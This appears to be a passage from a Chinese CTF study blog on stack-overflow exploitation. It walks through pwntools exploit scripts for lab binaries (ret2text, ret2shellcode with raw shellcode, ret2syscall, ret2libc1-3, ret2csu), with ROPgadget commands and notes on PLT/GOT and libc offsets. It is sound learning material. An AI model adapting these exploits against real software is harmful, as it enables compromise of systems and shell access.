class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 详细</span></span><br><span class="line">1、ret2text</span><br><span class="line"><span class="comment"># 利用程序中现有的后门函数，凭借gets()函数溢出覆盖ret  </span></span><br><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>、ret2shellcode</span><br><span class="line"><span class="comment"># 向可执行段写入shellcode，覆盖ret跳转至此执行shellcode </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#注：上下述exp在ubuntu20.04上执行不成功  $ readelf -t ./ret2shellcode</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xC9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">c = shellcode + <span class="string">b&#x27;a&#x27;</span>*<span class="number">89</span> + p32(buf2_addr)</span><br><span class="line">sh.sendline(c)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#理由：vmmap查看bss段可执行情况，ubuntu20.04的bss段不可执行，ubuntu18.04及以下版本可执行，可能是因为ubuntu20.04执行程序时默认开启了数据段不可执行</span></span><br><span class="line"><span class="comment">#理由2：看下方链接1、2</span></span><br><span class="line"><span class="comment">#其次，发现栈段可执行，这里可能就会想，我跳转到栈地址上的buf[0]处执行不就行了吗？但栈地址每次加载地址不定，除非泄露栈地址，不然无法准确跳转。</span></span><br></pre></td></tr></table></figure><p>链接1：<a href="https://f0rm2l1n.github.io/2022-04-02-What-is-happended-to-execstack/">执行堆栈发生了什么变化？ (f0rm2l1n.github.io)</a></p><p>链接2：<a href="https://stackoverflow.com/questions/64833715/linux-default-behavior-of-executable-data-section-changed-between-5-4-and-5-9">汇编 - Linux 默认行为的可执行 .data 部分在 5.4 和 5.9 之间更改？- 堆栈溢出 (stackoverflow.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>、ret2syscall</span><br><span class="line"><span class="comment"># 利用程序中的ROPgadget、&quot;/bin/sh&quot;构造能获取shell的汇编串，程序流自动执行ROPgadget获取shell</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># int 0x80 转内核模式，类比于syscall</span></span><br><span class="line"><span class="comment"># $ ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span></span><br><span class="line"><span class="comment"># $ ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span></span><br><span class="line"><span class="comment"># $ ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span></span><br><span class="line"><span class="comment"># $ ROPgadget --binary rop  --only &#x27;int&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget下载，下方链接3</span></span><br></pre></td></tr></table></figure><p>链接3：<a href="https://xiaoxiaoxy1.github.io/2022/03/26/ubuntu20-04%E5%AE%89%E8%A3%85/#ROPGadget-amp-one-gadget">ubuntu20.04 &amp; ubuntu16.04安装 | xiaoxiaoxy (xiaoxiaoxy1.github.io)</a></p><p><img src="image-20220805094132836.png" alt="image-20220805094132836"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>、ret2libc1</span><br><span class="line"><span class="comment">#利用程序中已调用过的system函数(地址存在plt表中)以及程序中存在的&quot;/bin/sh&quot;字符</span></span><br><span class="line"><span class="comment">#通过栈溢出构造栈上数据排布，使栈上数据排布为执行system(&quot;/bin/sh&quot;)时的数据排布</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 至于为什么要用plt表地址处的system函数，暂且解释为程序调用libc函数都是通过plt表来查找的</span></span><br><span class="line">   <span class="comment"># 程序第一次调用libc函数（puts函数）时调用过程如下：</span></span><br><span class="line">   <span class="comment"># 别人的说法：xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</span></span><br><span class="line">   <span class="comment"># 个人的理解：</span></span><br><span class="line">       <span class="comment"># puts@plt表(.plt)查询puts在GOT表dynamic段的地址</span></span><br><span class="line">       <span class="comment"># -&gt;Got表(.got)中查询puts在libc中的地址</span></span><br><span class="line">       <span class="comment"># -&gt;修改 puts@plt表(.plt)中 puts在GOT表dynamic段的地址 为 puts在libc中的地址</span></span><br><span class="line">       <span class="comment"># -&gt;将puts函数及其在libc中的地址写入公共plt表(.got.plt)，下次调用直接从这找puts在libc中的地址</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># 程序第二次及以后调用libc函数过程如下：</span></span><br><span class="line">   <span class="comment"># plt表查询puts在libc中的地址-&gt;去相应地址调用libc函数</span></span><br><span class="line">   <span class="comment"># 学习链接：下方链接4</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># ret至system函数中时，会先执行一个函数头，push ebp，保存上一次ebp所在位置，所以我们中间用bbbb来避开这个push</span></span><br><span class="line"><span class="comment"># 放了bbbb后，binsh_addr也就成了我们system函数的第一个参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 小彩蛋：Linux命令行中输入/bin/sh</span></span><br></pre></td></tr></table></figure><p>链接4：<a href="https://xiaoxiaoxy1.github.io/2022/04/16/%E5%8D%9A%E6%96%87%E6%94%B6%E8%97%8F/#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A">博文收藏 | xiaoxiaoxy (xiaoxiaoxy1.github.io)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>、ret2libc2</span><br><span class="line"><span class="comment">#第一次调用gets()函数将plt表中的gets()函数地址覆写到ret指令上并将buf2作为参数传入来达到二次输入的目的</span></span><br><span class="line"><span class="comment">#(这样就能将第二次输入的值传入buf2，同时也布置好了后期利用的buf2及system函数)二次调用gets向程序发送</span></span><br><span class="line"><span class="comment">#/bin/sh，即可将/bin/sh存入buf2，后期system函数是以buf2地址为参数，buf2存的是/binsh，也就是说</span></span><br><span class="line"><span class="comment">#system函数以/bin/sh为参数，等价于程序执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="string">b&#x27;bbbb&#x27;</span>, buf2])  </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#重申：为什么中间要穿插bbbb四个字符在ret2libc1中有讲解</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以下脚本适用于ubuntu20.04</span></span><br><span class="line"><span class="comment">#exp1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">a = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span> </span><br><span class="line">gets_addr = <span class="number">0x08048460</span> </span><br><span class="line">system_addr = <span class="number">0x08048490</span> </span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span> </span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">&#x27;What do you think ?&#x27;</span>)</span><br><span class="line">a.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2_addr))</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">a.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#exp2</span></span><br><span class="line"><span class="comment">##!/usr/bin/env python  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#思路，栈溢出计算偏移&amp;覆盖ret；跳gets，参数buf2或.bss段；跳system，参数/bin/sh</span></span><br><span class="line"></span><br><span class="line">a = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">buf2_addr = <span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>       <span class="comment"># 0x804a080 </span></span><br><span class="line">gets_addr = <span class="string">&#x27;\x60\x84\x04\x08&#x27;</span>       <span class="comment"># 0x08048460 </span></span><br><span class="line">system_addr = <span class="string">&#x27;\x90\x84\x04\x08&#x27;</span>     <span class="comment"># 0x08048490 </span></span><br><span class="line">pop_ebx_addr = <span class="string">&#x27;\x3d\x84\x04\x08&#x27;</span>    <span class="comment"># 0x0804843d </span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">&#x27;What do you think ?&#x27;</span>)</span><br><span class="line">a.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + gets_addr + pop_ebx_addr + buf2_addr + system_addr + <span class="string">&#x27;aaaa&#x27;</span> + buf2_addr)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">a.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># $ ROPgadget --binary ret2libc2  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>、ret2libc3</span><br><span class="line"><span class="comment"># ...搞了快一天了，ubuntu20.04、18.04、16.04三个虚拟机一个都没打通，这里就简单记下思路吧，exp就不写了</span></span><br><span class="line"><span class="comment"># payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])</span></span><br><span class="line">  <span class="comment"># puts_plt覆盖至ret实现puts函数的重调，</span></span><br><span class="line">  <span class="comment"># main函数地址作为上一栈帧rbp，puts执行完就可以重新执行main函数</span></span><br><span class="line">  <span class="comment"># libc_start_main_got为puts的参数，使puts函数打印出got表上libc_start_main的地址，实现地址泄露</span></span><br><span class="line"><span class="comment"># 利用泄露出的libc_start_main地址，在链接5上查询libc版本，找system()、/bin/sh的偏移</span></span><br><span class="line"><span class="comment"># 计算出system()、/bin/sh在libc中的地址，第二次发送pyload即可拿到shell</span></span><br><span class="line"><span class="comment"># payload = flat([&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 好吧，在两位大佬的指导下，我调出了这道题</span></span><br><span class="line"><span class="comment"># 步骤</span></span><br><span class="line">  <span class="comment"># 因为LibcSearcher的库中搜不到我ubuntu20.04上的libc库，而题目依赖的就是我本机的libc库</span></span><br><span class="line">  <span class="comment"># 所以我只需要把本机的libc库丢进ida就能查找函数偏移，找到之后写入exp中就拿到shell了</span></span><br><span class="line">  <span class="comment"># 顺带提一下，现在绝大多数的ctf题都会给libc.so.6文件，所以基本用不到LibcSearcher</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">start_addr = <span class="number">0x80484d0</span></span><br><span class="line">puts_plt_addr = <span class="number">0x8048460</span></span><br><span class="line">libc_start_main_got_addr = <span class="number">0x804a024</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Can you find it !?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;q&#x27;</span>*<span class="number">112</span> + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;__lic_start_main_addr: &quot;</span> + <span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - <span class="number">0x1ADF0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x41790</span></span><br><span class="line">binsh_addr = libcbase + <span class="number">0x18E363</span> </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;binsh_addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Can you find it !?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;s&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># $ ldd &lt;二进制程序&gt;</span></span><br><span class="line">  回显中带有:&lt;路径&gt;/libc.so<span class="number">.6</span></span><br><span class="line"><span class="comment"># $ &lt;路径&gt;/libc.so.6</span></span><br><span class="line"><span class="comment"># $ cp &lt;路径&gt;/libc.so.6 ./</span></span><br></pre></td></tr></table></figure><p><img src="image-20220805191502901.png" alt="image-20220805191502901"></p><p><img src="image-20220805191428321.png" alt="image-20220805191428321"></p><p>链接5：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p><p><img src="image-20220805173746709.png" alt="image-20220805173746709"></p><br/><h4 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、ret2csu</span><br><span class="line"><span class="comment">#思路：</span></span><br><span class="line">  <span class="comment">#1、借助__libc_csu_init中的两个有效片段，实现对寄存器的数据写入</span></span><br><span class="line">  <span class="comment">#2、重调write函数，泄露libc地址，ida反编译libc.so.6查找相关偏移值</span></span><br><span class="line">  <span class="comment">#3、重调read函数，向bss段写入system(&quot;/bin/sh&quot;)</span></span><br><span class="line">  <span class="comment">#4、跳转到bss段执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> execve</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">r   = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got  = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_adr  = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">bss_adr   = elf.bss()</span><br><span class="line">fackebp   = <span class="number">8</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">csu_front_adr = <span class="number">0x00000000004005F0</span></span><br><span class="line">csu_last_adr  = <span class="number">0x0000000000400606</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got = &quot;</span>,write_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nread_got =&quot;</span>,read_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nmain_addr =&quot;</span>,main_adr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bss_adr = 0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(bss_adr))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15,last</span>):</span></span><br><span class="line">    <span class="comment"># rbx 0  前两个寄存器</span></span><br><span class="line">    <span class="comment"># rbp 1  这样设置可绕过 cmp rbx, rbp 检测</span></span><br><span class="line">    <span class="comment"># r12    想要调用的函数地址</span></span><br><span class="line">    <span class="comment"># r13    rdi(函数调用的第一个参数)</span></span><br><span class="line">    <span class="comment"># r14    rsi(第二个参数)</span></span><br><span class="line">    <span class="comment"># r15    rdx(第三个)</span></span><br><span class="line">    payload=<span class="number">128</span>*<span class="string">b&#x27;A&#x27;</span>+fackebp</span><br><span class="line">    payload+=p64(csu_last_adr)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(rbx)</span><br><span class="line">    payload+=p64(rbp)</span><br><span class="line">    payload+=p64(r12)</span><br><span class="line">    payload+=p64(r13)</span><br><span class="line">    payload+=p64(r14)</span><br><span class="line">    payload+=p64(r15)</span><br><span class="line">    payload+=p64(csu_front_adr)</span><br><span class="line">    payload+=<span class="number">56</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">    payload+=p64(last)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_adr)</span><br><span class="line"> </span><br><span class="line">write_adr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;write_adr: &quot;</span> + <span class="built_in">hex</span>(write_adr))</span><br><span class="line">write_libc  = <span class="number">0x10E090</span>    </span><br><span class="line">system_libc = <span class="number">0x522C0</span>     </span><br><span class="line"></span><br><span class="line">execve_libc = <span class="number">0xE31A0</span></span><br><span class="line"></span><br><span class="line">bin_sh_libc = <span class="number">0x1B45BD</span></span><br><span class="line"></span><br><span class="line">offset=write_adr-write_libc</span><br><span class="line">system_adr=offset+system_libc</span><br><span class="line">bin_sh_adr=offset+bin_sh_libc</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">#csu(0,1,system_adr,bin_sh_adr,0,0,main_adr)  #通过system(&quot;/bin/sh&quot;)  拿不到shell</span></span><br><span class="line"><span class="comment">#csu(0,1,execve_libc,bin_sh_adr,0,0,main_adr)  #execve(&quot;/bin/sh&quot;,0,0) 也不行</span></span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss_adr,<span class="number">16</span>,main_adr)</span><br><span class="line">r.send(p64(system_adr)+<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,bss_adr,bss_adr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,main_adr)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>对于上述 ↑ exp 为什么用system(“/bin/sh”)不行，个人暂且的理解是call指令无法实现远地址跳转，而system真实地址在libc那边，超过了16位偏移，所以无法直接实现跳转(如果是ret指令的话则应该可以)，而先跳到较近的bss段去执行栈上写入的system(“/bin/sh”)则可以实现。</p><p><a href="https://www.cnblogs.com/xiangsikai/p/12467932.html">8086 汇编 jmp 指令 - kevin.Xiang - 博客园 (cnblogs.com)</a></p><p>下图说法有问题，cmp是比较指令，两个值相等则不执行jnz跳转</p><p><img src="image-20220809113413722.png" alt="image-20220809113413722"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 